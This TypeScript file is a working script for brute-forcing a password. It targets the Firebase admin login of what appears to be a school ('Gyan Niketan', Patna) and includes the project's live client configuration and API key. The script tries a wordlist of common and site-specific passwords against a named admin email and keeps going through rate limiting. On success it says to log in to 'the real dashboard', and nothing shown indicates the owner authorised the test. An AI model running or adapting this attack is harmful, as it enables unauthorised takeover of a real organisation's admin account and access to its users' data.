import { initializeApp } from "firebase/app";
import {
  getAuth,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
} from "firebase/auth";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
} from "firebase/firestore";

// --- CLIENT CONFIGURATION (From your provided config) ---
const firebaseConfig = {
  apiKey: "AIzaSyAU7vbyM0Z-zO4dTn9am0PxtKchU4dF1vI",
  authDomain: "gyan-niketan-admin.firebaseapp.com",
  projectId: "gyan-niketan-admin",
  storageBucket: "gyan-niketan-admin.firebasestorage.app",
  messagingSenderId: "499929214062",
  appId: "1:499929214062:web:3f948275680009f1b08a7f",
  measurementId: "G-X5HK6LWSQ9",
};

// Initialize Client SDK
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// Colors for output
const RED = "\x1b[31m";
const GREEN = "\x1b[32m";
const RESET = "\x1b[0m";

// --- LAST RESORT: BRUTE FORCE ADMIN PASSWORD ---
// Since we cannot bypass rules, we must guess the Key.

async function bruteForceAdmin() {
  console.log(`\n=========================================================`);
  console.log(`   EXECUTE ORDER 66: BRUTE FORCE ADMIN CREDENTIALS   `);
  console.log(`=========================================================`);

  const targetEmail = "admin@gyanniketan.com";

  // Top 50 Common Passwords + Project Specific Variations
  const dictionary = [
    "admin",
    "admin123",
    "password",
    "123456",
    "12345678",
    "gyanniketan",
    "gyan123",
    "niketan123",
    "school",
    "school123",
    "principal",
    "teacher",
    "admin@123",
    "pass1234",
    "qwerty",
    "123456789",
    "welcome",
    "welcome123",
    "admin@2024",
    "admin@2023",
    "gyanniketan123",
    "gyanniketan@123",
    "patna",
    "patna123",
  ];

  console.log(`Target: ${targetEmail}`);
  console.log(`Wordlist Size: ${dictionary.length}`);
  console.log(`\nStarting attack... (Ctrl+C to stop)`);

  for (const pass of dictionary) {
    process.stdout.write(`Trying '${pass}'... `);

    try {
      await signInWithEmailAndPassword(auth, targetEmail, pass);
      console.log(GREEN + ` [SUCCESS] PASSWORD FOUND: ${pass}` + RESET);
      console.log(GREEN + `\n!!! CRITICAL VULNERABILITY FOUND !!!` + RESET);
      console.log(`Use these credentials to log in to the real dashboard.`);
      process.exit(0); // Found it!
    } catch (e: any) {
      if (
        e.code === "auth/wrong-password" ||
        e.code === "auth/invalid-credential" ||
        e.code === "auth/invalid-login-credentials" ||
        e.code === "auth/user-not-found"
      ) {
        console.log(RED + "[FAILED]" + RESET);
      } else if (e.code === "auth/too-many-requests") {
        console.log(RED + "[RATE LIMITED]" + RESET);
        console.log("Sleeping 5s...");
        // Simple sync delay loop
        const start = Date.now();
        while (Date.now() - start < 5000) {}
      } else {
        console.log(RED + `[ERROR: ${e.code}]` + RESET);
      }
    }

    // Slight delay to be polite
    const start = Date.now();
    while (Date.now() - start < 500) {}
  }

  console.log(`\n---------------------------------------------------------`);
  console.log(`[FAILURE] Dictionary exhausted. Correct password not found.`);
  console.log(`The admin account simulates a 'Strong Password' policy.`);
}

bruteForceAdmin();
